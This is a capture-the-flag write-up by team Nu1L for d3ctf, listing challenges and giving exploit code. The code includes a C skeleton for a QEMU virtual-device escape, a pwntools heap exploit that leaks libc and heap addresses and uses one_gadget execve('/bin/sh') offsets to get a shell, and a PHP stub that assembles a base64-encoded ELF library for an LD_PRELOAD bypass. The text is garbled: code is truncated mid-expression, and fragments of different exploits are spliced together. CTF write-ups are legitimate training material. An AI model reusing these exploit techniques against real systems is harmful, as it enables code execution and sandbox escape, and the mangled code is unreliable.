d3ctf WriteUp By Nu1L
author:Nu1L
d3ctf WriteUp By Nu1L
PWN
d3dev
d3dev-revenge
Truth
hackphp
liproll
Reverse
jumpjump
baby_spear
No Name
white give
Ancient
Crypto
babyLattice
WEB
8-bit pub
non RCE?
Happy_Valentine's_Day
Pool Calc
real_cloud_storage
real_cloud_serverless
Misc
Virtual Love_Revenge
Virtual Love
easyQuantum
Signin
shellgen2
PWN
d3dev
没关monitor,直接搞
d3dev-revenge
mmio有越界读写 控制⼀下seek和addr,中间有个tea
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
unsigned char *mmio_mem;
void die(const char *msg) {
    perror(msg);
    exit(-1);
}
unsigned int pmio_base = 0xc040;
uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr+pmio_base);
}
void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, addr+pmio_base);
}
void mmio_write(uint32_t addr, uint64_t value)
{
    *((uint64_t *)(mmio_mem + addr)) = value;
}
uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t *)(mmio_mem + addr));
}
void enc (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant 
*/
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i >5) + k1);
        v1 += ((v0>5) + k3);
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}
void dec (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant 
*/
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i>5) + k3);
        v0 -= ((v1>5) + k1);
        sum -= delta;
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}
uint64_t u64(char * s){
    uint64_t result = 0;
    for (int i = 7 ; i >=0 ;i--){
        result = (result aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaa
cccdddddddddddddddddddddddddeeeeeeee{0}
\xff'''.format('\xda'*0x5))
p.recvuntil(':')
p.sendline('4')
p.recvuntil('MEME')
p.sendline('a')
p.recvuntil('Useless')
leak_libc = u64(p.recv(6) + '\x00\x00') - 3951608
print(hex(leak_libc))
payload = '\xaa' * 0x58 + 'x' * 24
#(p64(49) + p64(0xdeadbeef) + p64(0x100000001) +p64(0xdeadbeef) * 3 + p64(0x21) 
+ p64(0xdeadbeef) * 3)*2
# 0x24a2980 - 0x24a2aa0
edit('f',payload)
edit('f','b'*0x57)
p.recvuntil(':')
p.sendline('4')
p.recvuntil('MEME')
p.sendline('f')
p.recvuntil('x'*24)
leak_heap = u64(p.recvline()[:-1].ljust(8,'\x00')) - 76320
print(hex(leak_heap))
chunk_addr = leak_heap + 76160 + 0x10
fake_obj = p64(chunk_addr + 0x20) + p64(leak_heap + 75208)
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
0x00000000001ad889 : xchg esp, esi ; call qword ptr [rax]
'''
payload = fake_obj + '\xbb' * 0x10+\
p64(chunk_addr + 0x48) + p64(chunk_addr + 0x40) +  p64(1) + p64(chunk_addr + 
0x48) + p64(ord('d'))+\
p64(leak_libc + 0x47B8C) + p64(0xdeadbeef) +\
(p64(49) + p64(0xdeadbeef) + p64(0x100000001) +p64(0xdeadbeef) * 3 + p64(0x21) 
+ p64(0xdeadbeef) * 3) + \
hackphp
直接LD_PRELOAD绕过去了
(p64(49) + p64(0xdeadbeef) + p64(0x100000001) +p64(leak_libc + 0x45226) * 3 + 
p64(0x21) + p64(0xdeadbeef) * 3) + \
p64(49) + p64(0xdeadbeef) + p64(0x100000001)  + p64(chunk_addr)
# 0x11c59b0 0x11c5990
edit('f',payload)
edit('f','b'*0x100)
p.recvuntil(':')
p.sendline('4')
p.recvuntil('MEME')
p.sendline('d')
p.interactive()
<?php
$so="";
$so = $so.'f0VMRgIBAQAAAAAAAAAAAAMAPgABAA';
$so = $so.'AAwBAAAAAAAABAAAAAAAAAAFg4AAAA';
$so = $so.'AAAAAAAAAEAAOAALAEAAHgAdAAEAAA';
$so = $so.'AEAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
$so = $so.'AAAAAAAA2AUAAAAAAADYBQAAAAAAAA';
$so = $so.'AQAAAAAAAAAQAAAAUAAAAAEAAAAAAA';
$so = $so.'AAAQAAAAAAAAABAAAAAAAADVAQAAAA';
$so = $so.'AAANUBAAAAAAAAABAAAAAAAAABAAAA';
$so = $so.'BAAAAAAgAAAAAAAAACAAAAAAAAAAIA';
$so = $so.'AAAAAAAAQBAAAAAAAABAEAAAAAAAAA';
$so = $so.'EAAAAAAAAAEAAAAGAAAAEC4AAAAAAA';
$so = $so.'AQPgAAAAAAABA+AAAAAAAAMAIAAAAA';
$so = $so.'AAA4AgAAAAAAAAAQAAAAAAAAAgAAAA';
$so = $so.'YAAAAgLgAAAAAAACA+AAAAAAAAID4A';
$so = $so.'AAAAAADAAQAAAAAAAMABAAAAAAAACA';
$so = $so.'AAAAAAAAAEAAAABAAAAKgCAAAAAAAA';
$so = $so.'qAIAAAAAAACoAgAAAAAAACAAAAAAAA';
$so = $so.'AAIAAAAAAAAAAIAAAAAAAAAAQAAAAE';
$so = $so.'AAAAyAIAAAAAAADIAgAAAAAAAMgCAA';
$so = $so.'AAAAAAJAAAAAAAAAAkAAAAAAAAAAQA';
$so = $so.'AAAAAAAAU+V0ZAQAAACoAgAAAAAAAK';
$so = $so.'gCAAAAAAAAqAIAAAAAAAAgAAAAAAAA';
$so = $so.'ACAAAAAAAAAACAAAAAAAAABQ5XRkBA';
$so = $so.'AAABggAAAAAAAAGCAAAAAAAAAYIAAA';
$so = $so.'AAAAADQAAAAAAAAANAAAAAAAAAAEAA';
$so = $so.'AAAAAAAFHldGQGAAAAAAAAAAAAAAAA';
$so = $so.'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
$so = $so.'AAAAAAAAAAABAAAAAAAAAAUuV0ZAQA';
$so = $so.'AAAQLgAAAAAAABA+AAAAAAAAED4AAA';
$so = $so.'AAAADwAQAAAAAAAPABAAAAAAAAAQAA';
$so = $so.'AAAAAAAEAAAAEAAAAAUAAABHTlUAAg';
$so = $so.'AAwAQAAAADAAAAAAAAAAQAAAAUAAAA';
$so = $so.'AwAAAEdOVQDkObEOusfhpJ6T8cgz2Y';
$so = $so.'XSUhXM5AAAAAACAAAACAAAAAEAAAAG';
$so = $so.'AAAAAIgAAIAQAAAIAAAACQAAAO2Sc/';